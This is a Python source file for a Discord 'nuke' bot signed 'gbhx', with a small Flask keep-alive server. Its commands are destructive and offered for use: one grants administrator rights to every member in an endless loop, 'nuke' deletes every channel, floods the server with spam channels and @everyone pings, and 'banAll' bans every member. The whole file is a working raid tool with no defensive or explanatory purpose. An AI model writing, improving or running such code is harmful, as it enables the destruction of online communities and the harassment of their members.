#made by gbhx
from discord import Permissions
import discord, random, time
import json
from discord.ext import commands
import os
import colorama
import asyncio
from colorama import Fore
from discord import Embed
from flask import Flask
from threading import Thread

app = Flask(__name__)


@app.route("/")
def home():
    return "Gbhx nuke bot is online!"


def run():
    app.run(host="0.0.0.0", port=8080)


Thread(target=run).start()

colorama.init()
intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents)
bot.remove_command("help")
with open('config.json') as f:
    data = json.load(f)
    token = data["TOKEN"]


@bot.event
async def on_ready():
    print(f'''
{Fore.LIGHTCYAN_EX}╔╗╔┬ ┬┬┌─┌─┐┬─┐        
{Fore.LIGHTCYAN_EX}║║║│ │├┴┐├┤ ├┬┘        
{Fore.LIGHTCYAN_EX}╝╚╝└─┘┴ ┴└─┘┴└─    
Logged in and Ready                
''')


@bot.command(pass_context=True)
async def admin(ctx):
    await ctx.message.delete()
    while True:
        try:
            guild = ctx.guild
            role = await guild.create_role(name="GBHX NUKER",
                                           permissions=discord.Permissions(8),
                                           colour=discord.Colour(000000))
            for user in ctx.guild.members:
                await user.add_roles(role)
                print("Gave you admin ")
        except:
            print("Couldnt give you admin")






@bot.command()
async def nuke(ctx, amount=30, name_of_channel="nuked-by-gbhx"):

    await ctx.guild.edit(name="NUKED BY GBHX")


    await ctx.message.delete()


    delete_tasks = []
    for channel in ctx.guild.channels:
        if channel.name != name_of_channel:
            delete_tasks.append(channel.delete())
    await asyncio.gather(*delete_tasks)


    create_tasks = [ctx.guild.create_text_channel(name_of_channel) for _ in range(amount)]
    await asyncio.gather(*create_tasks)

 
    valid_channel = None
    for channel in ctx.guild.text_channels:
        if isinstance(channel, discord.TextChannel):
            valid_channel = channel
            break

    if valid_channel:
        webhooks = await valid_channel.webhooks()
        webhook = discord.utils.get(webhooks, name='Spammer')


        send_tasks = []
        for _ in range(30):  
            for channel in ctx.guild.text_channels:
                try:
                    send_tasks.append(channel.send(f"Nuked! @everyone GBHX OWNS YOU"))
                    if webhook:
                        send_tasks.append(webhook.send(f"Nuked! @everyone GBHX OWNS YOU"))
                except discord.DiscordException:
                    pass  

  
        await asyncio.gather(*send_tasks)



@bot.command()
async def banAll(ctx):
    await ctx.message.delete()
    for user in ctx.guild.members:
        try:
            await user.ban()
            print(f"Banned {user}")
        except:
            pass


bot.run(token)
